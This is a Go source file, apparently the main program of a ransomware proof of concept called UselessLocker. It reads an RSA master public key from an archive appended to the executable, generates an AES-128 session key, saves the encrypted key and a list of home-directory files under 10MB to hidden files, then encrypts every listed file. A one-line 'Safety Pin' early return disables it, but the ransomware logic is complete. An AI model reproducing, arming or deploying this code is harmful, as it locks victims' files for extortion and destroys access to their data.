package main

import (
	"io/ioutil"
	"log"
	"os/user"
	"path/filepath"

	"github.com/TheCreeper/UselessLocker"
	"github.com/TheCreeper/UselessLocker/crypto"
	"github.com/TheCreeper/UselessLocker/store"
)

func main() {
	// Safety Pin
	if true {
		return
	}

	// Get info (home dir path) for the user that the executable is
	// running under.
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	// Open the zip archive apended onto the executable as a virtual
	// filesystem.
	store, err := store.Open()
	if err != nil {
		log.Fatal(err)
	}

	// Copy the public key from the store.
	pub, err := store.ReadFile("/master.pem")
	if err != nil {
		log.Fatal(err)
	}

	// Generate the session key. It's best to use AES-128 instead of
	// AES-256 as it can be 30% faster and the security lost is negligible.
	// Despite AES-256 being a post-quantum cipher, RSA is not and
	// therefore there is no point using AES-256.
	key, err := crypto.GenerateKey(crypto.AES128)
	if err != nil {
		log.Fatal(err)
	}

	// Encrypt the newly generated session key using the master public
	// key and write it out to the filesystem as soon as possible. We
	// don't want to encrypt files and lose the key.
	ekey, err := crypto.EncryptKey(pub, key)
	if err != nil {
		log.Fatal(err)
	}

	// Write out the session key preferably to the users home directory.
	pathKey := filepath.Join(usr.HomeDir, ".uselesskey")
	if err = ioutil.WriteFile(pathKey, ekey, 0644); err != nil {
		log.Fatal(err)
	}

	// Get a list of files in the users home directory that are less
	// than 10MB.
	ls, err := useless.GetFileList(usr.HomeDir, 10485760)
	if err != nil {
		log.Fatal(err)
	}

	// Write out the file list to a file somewhere on the filesystem. We
	// don't want to lose this otherwise we wont know which files were
	// previously encrypted.
	pathList := filepath.Join(usr.HomeDir, ".uselesslist")
	if err = useless.WriteFileList(pathList, ls); err != nil {
		log.Fatal(err)
	}

	// Start encrypting each file in the list.
	for _, file := range ls {
		if err = crypto.EncryptFile(key, file); err != nil {
			log.Fatal(err)
		}
	}
}
